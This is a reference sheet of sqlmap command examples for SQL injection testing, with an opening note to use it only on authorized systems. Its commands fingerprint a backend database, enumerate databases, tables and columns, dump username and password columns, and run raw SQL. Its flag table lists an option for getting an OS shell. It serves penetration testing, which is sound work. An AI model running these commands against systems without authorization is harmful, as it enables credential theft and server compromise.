# sqlmap — real-world examples

> Only run sqlmap against systems you own or are explicitly authorized to test.

## Test a URL with POST data and grab the DB banner

```sh
sqlmap --url="http://target/login" --data="user=a&pass=b" --banner
```

## Replay a captured request (e.g. saved from Burp)

```sh
sqlmap -r request.txt --batch
```

## Fingerprint the backend DBMS

```sh
sqlmap -r request.txt --fingerprint
```

## Identify current user, database, and hostname

```sh
sqlmap -r request.txt --current-user --current-db --hostname
```

## Check for DBA privileges

```sh
sqlmap -r request.txt --is-dba
```

## Enumerate databases, tables, columns

```sh
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D appdb --tables
sqlmap -r request.txt -D appdb -T users --columns
```

## Dump data from a table

```sh
sqlmap -r request.txt -D appdb -T users -C username,password --dump
```

## Run a raw SQL query

```sh
sqlmap -r request.txt --sql-query="SELECT version()"
```

## Flag reference

| Flag           | What it does                        |
| -------------- | ----------------------------------- |
| -r file        | load an HTTP request from a file    |
| --data         | POST body to test                   |
| --batch        | accept default answers, no prompts  |
| -D / -T / -C   | scope to db / table / column        |
| --dump         | extract the selected data           |
| --os-shell     | attempt an interactive OS shell     |
